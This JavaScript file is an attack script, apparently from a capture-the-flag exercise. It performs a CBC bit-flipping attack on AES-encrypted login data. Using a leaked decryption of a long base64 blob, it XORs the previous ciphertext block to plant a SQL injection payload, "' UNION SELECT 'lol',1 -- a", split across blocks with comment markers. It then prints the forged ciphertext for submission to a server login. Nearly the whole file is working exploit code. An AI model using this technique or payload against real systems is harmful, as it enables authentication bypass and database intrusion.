// Input string that I generated (A ton of As) and the response frmo the server
var inputCipherString
var inputDecryptedString = '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';

// Load these two strings into buffers, base64 decoding the server response
var inputCipherBuffer = Buffer.from(decodeURIComponent(inputCipherString), 'base64');
var inputDecryptedBuffer = Buffer.from(inputDecryptedString, 'base64');

// This is what we want to inect into the AES cipher blocks
var myRes = "' UNION        SELECT      'lol',1 -- a";

// Block sizing info
var blockSize = 16;
var startPos = blockSize;

// Convert the payload from above into parts that fit into blocks (14 or 12 characters once you add the /* and */)
var resParts = [];
var odd = false;
for(var i=0; i<myRes.length;) {
	if(!odd) {
		odd = true;
		var theString = myRes.substr(i, blockSize - 2);
		theString = theString + '/*';
		i += blockSize - 2
	} else {
		var theString = myRes.substr(i, blockSize - 4);
		theString = '*/' + theString + '/*';
		i += blockSize - 4
	}

	resParts.push(theString);
}

// Loop over each of the blocks
for(var blockNum=0; blockNum<resParts.length; ++blockNum) {
	// Grab the payload we are going to inject from above
	var resPart = resParts[blockNum];

	// Figure out which block this needs to be injected into
	var injectBlock = blockNum * 2 + 1;
	var startPos = injectBlock * blockSize;

	// Loop over all the positions in this block
	// XOR together 3 things:
	    // What the server told us the plaintext is in this position
	    // Our cipher text from the SAME POSITION but in the PREVIOUS BLOCK
	    // What we want the text in this spot to actually become
	for(var i=0; i<resPart.length; ++i) {
		inputCipherBuffer[startPos + i - blockSize] = 
		inputDecryptedBuffer[startPos + i]
		^ inputCipherBuffer[startPos + i - blockSize]
		^ resPart.charCodeAt(i);
	}
}





//inputCipherBuffer = Buffer.from([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);

// Log out the string to push to the server to login
console.log(encodeURIComponent(inputCipherBuffer.toString('base64')));

// Print out what our attack string would look like decrypted
console.log('Attack string: ' + resParts.join('XXXXXXXXXXXXXXXX'));
